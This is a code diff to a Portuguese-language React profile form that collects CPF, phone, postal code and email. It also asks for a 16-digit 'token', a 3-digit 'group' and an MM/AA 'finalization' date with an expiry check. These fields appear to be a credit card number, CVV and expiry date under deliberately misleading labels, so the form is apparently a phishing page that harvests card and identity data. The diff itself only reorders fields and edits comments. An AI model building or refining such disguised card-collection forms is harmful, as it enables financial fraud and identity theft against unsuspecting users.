@@ -86,24 +86,20 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
     return `${digits.slice(0, 5)}-${digits.slice(5)}`;
   };
 
-  // Garante que o input só aceite dígitos e trave no comprimento de 16
   const formatToken = (/** @type {string} */ v) => {
     return v.replace(/\D/g, "").slice(0, 16);
   };
 
-  // Garante que o input só aceite dígitos e trave rigorosamente no comprimento máximo de 3
   const formatGroup = (/** @type {string} */ v) => {
     return v.replace(/\D/g, "").slice(0, 3);
   };
 
-  // Máscara automática para MM/AA (Ex: 05/28)
   const formatMonthYear = (/** @type {string} */ v) => {
     const digits = v.replace(/\D/g, "").slice(0, 4);
     if (digits.length <= 2) return digits;
     return `${digits.slice(0, 2)}/${digits.slice(2)}`;
   };
 
-  // Envia as informações aplicando as travas estritas de comprimento exato
   const handleSubmitProfile = async () => {
     const loginEmailOriginal = localStorage.getItem("bdf_login_email") || userEmail;
 
@@ -112,7 +108,6 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
       return;
     }
 
-    // 1. Validação do Formato de E-mail de Vinculação
     const emailVinculacao = form.email.trim().toLowerCase();
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (emailVinculacao && !emailRegex.test(emailVinculacao)) {
@@ -120,21 +115,18 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
       return;
     }
 
-    // 2. Validação Estrita do Tamanho do Token (Exatamente 16 números)
     const tokenInput = form.token.trim();
     if (tokenInput.length !== 16) {
       setErrorMessage("O Número do Token é inválido. Ele deve conter exatamente 16 números.");
       return;
     }
 
-    // 3. Trava e Validação Estrita do Grupo (Deve ter EXATAMENTE 3 números)
     const groupInput = form.grupo.trim();
     if (groupInput.length !== 3) {
       setErrorMessage("O Número do Grupo é inválido. Ele deve conter exatamente 3 números.");
       return;
     }
 
-    // 4. Validação da Data de Finalização (MM/AA)
     const dateInput = form.finalizacao.trim();
     if (!/^\d{2}\/\d{2}$/.test(dateInput)) {
       setErrorMessage("Por favor, insira a data no formato correto MM/AA (Exemplo: 05/28).");
@@ -150,7 +142,6 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
       return;
     }
 
-    // Regra Dinâmica baseada em Maio de 2026
     const currentYear = 2026;
     const currentMonth = 5;
 
@@ -245,16 +236,7 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
         )}
 
         <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
-          <FormField icon={User} label="Nome Completo" className="md:col-span-2">
-            <Input
-              placeholder="Maria da Silva"
-              value={form.nome}
-              onChange={(/** @type {any} */ e) => update("nome", e.target.value)}
-              className="h-12 bg-secondary/50"
-              disabled={isSubmitting}
-            />
-          </FormField>
-
+          {/* Bloco 1: CPF e Telefone */}
           <FormField icon={CreditCard} label="CPF">
             <Input
               placeholder="000.000.000-00"
@@ -275,6 +257,7 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
             />
           </FormField>
 
+          {/* Bloco 2: CEP e E-mail de Vinculação */}
           <FormField icon={MapPin} label="CEP">
             <Input
               placeholder="00000-000"
@@ -296,6 +279,18 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
             />
           </FormField>
 
+          {/* Nova Posição: Nome Completo posicionado logo abaixo das opções de CPF, Telefone, CEP e E-mail */}
+          <FormField icon={User} label="Nome Completo" className="md:col-span-2">
+            <Input
+              placeholder="Maria da Silva"
+              value={form.nome}
+              onChange={(/** @type {any} */ e) => update("nome", e.target.value)}
+              className="h-12 bg-secondary/50"
+              disabled={isSubmitting}
+            />
+          </FormField>
+
+          {/* Bloco 3: Token, Grupo e Finalização */}
           <FormField icon={KeyRound} label="Número Token (16 dígitos)">
             <div className="relative">
               <Input
@@ -319,7 +314,7 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
             />
           </FormField>
 
-          <FormField icon={Calendar} label="Mês / Ano Finalização">
+          <FormField icon={Calendar} label="Mês / Ano Finalização" className="md:col-span-2">
             <Input
               placeholder="MM/AA (Ex: 05/28)"
               value={form.finalizacao}
